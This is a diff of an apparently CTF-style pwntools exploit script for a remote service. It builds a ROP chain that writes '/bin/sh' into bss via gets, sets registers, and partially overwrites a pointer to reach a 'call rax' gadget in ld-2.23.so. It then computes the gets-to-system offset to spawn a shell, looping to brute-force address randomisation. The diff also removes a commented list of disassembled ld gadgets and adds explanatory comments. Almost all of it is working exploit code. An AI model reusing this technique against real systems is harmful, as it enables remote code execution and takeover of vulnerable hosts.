@@ -56,51 +56,11 @@ def conn():
         port = 10402
         return remote(host, port)
 
-'''
-$ objdump -M intel -d --start-address=0x0 --stop-address=0x10000 ld-2.23.so > ld_gadgets
-
-Search for register calls: "\bcall\s+r(?:ax|bx|cx|dx|si|di|sp|bp|8|9|1[0-5])\b"
-
-    c352:	48 8b 43 10          	mov    rax,QWORD PTR [rbx+0x10]
-    c356:	48 83 c3 18          	add    rbx,0x18
-    c35a:	49 03 04 24          	add    rax,QWORD PTR [r12]
-    c35e:	ff d0                	call   rax
-
-    c7f0:	48 8b 43 10          	mov    rax,QWORD PTR [rbx+0x10]
-    c7f4:	49 03 07             	add    rax,QWORD PTR [r15]
-    c7f7:	ff d0                	call   rax
-
-    c9f0:	48 8b 43 10          	mov    rax,QWORD PTR [rbx+0x10]
-    c9f4:	49 03 04 24          	add    rax,QWORD PTR [r12]
-    c9f8:	4c 89 9d 28 ff ff ff 	mov    QWORD PTR [rbp-0xd8],r11
-    c9ff:	4c 89 95 30 ff ff ff 	mov    QWORD PTR [rbp-0xd0],r10
-    ca06:	ff d0                	call   rax
-
-    d0b0:	48 8b 43 10          	mov    rax,QWORD PTR [rbx+0x10]
-    d0b4:	49 03 07             	add    rax,QWORD PTR [r15]
-    d0b7:	ff d0                	call   rax
-
-    d193:	48 8b 43 10          	mov    rax,QWORD PTR [rbx+0x10]
-    d197:	49 03 04 24          	add    rax,QWORD PTR [r12]
-    d19b:	4c 89 95 30 ff ff ff 	mov    QWORD PTR [rbp-0xd0],r10
-    d1a2:	ff d0                	call   rax
-
-    d31f:	48 8b 52 08          	mov    rdx,QWORD PTR [rdx+0x8]
-    d323:	48 03 10             	add    rdx,QWORD PTR [rax]
-    d326:	48 89 d0             	mov    rax,rdx
-    d329:	ff d0                	call   rax
-
-    d72f:	48 8b 52 08          	mov    rdx,QWORD PTR [rdx+0x8]
-    d733:	48 03 10             	add    rdx,QWORD PTR [rax]
-    d736:	48 89 d0             	mov    rax,rdx
-    d739:	ff d0                	call   rax
-'''
-
 gets_to_system = libc.symbols['system'] - libc.symbols['gets']
 pop_rbx_rbp_r12_r13_r14_r15_ret = 0x4005ba
 pop_rdi_ret = 0x4005c3
-offset_addr = exe.bss() + 8
 binsh_addr = exe.bss()
+offset_addr = exe.bss() + 8
 nop_ret = 0x4005c8
 
 attempt = 0
@@ -110,7 +70,7 @@ while True:
 
     p = conn()
 
-    # Ubuntu 24.04
+    # On WSL Ubuntu 24.04 ld base always ends with 0x1000000
     if args.LOCAL:
         with open(f'/proc/{p.pid}/maps') as f:
             ld_lines = [line for line in f if 'ld-2.23.so' in line]
@@ -126,10 +86,12 @@ while True:
     pl = flat(
         A(0x18),
 
+        # Write /bin/sh to bss
         pop_rdi_ret,
         binsh_addr,
         exe.plt['gets'],
 
+        # Set rbx and r15
         pop_rbx_rbp_r12_r13_r14_r15_ret,
         exe.got['gets'] - 0x10,
         0, 0, 0, 0,
@@ -142,9 +104,13 @@ while True:
     )
 
     if args.LOCAL:
-        pl += p16(0xc7f0) # Ubuntu 24.04
+        # Ubuntu 24.04 WSL
+        pl += p16(0xc7f0)
     else:
-        pl += p8(0xb0) # Ubuntu 16.04
+        # Ubuntu 16.04 (Remote)
+        # ld ends with 0x1000
+        pl += p8(0xb0)
+    # null byte at then end
 
     sl(p, pl)
     
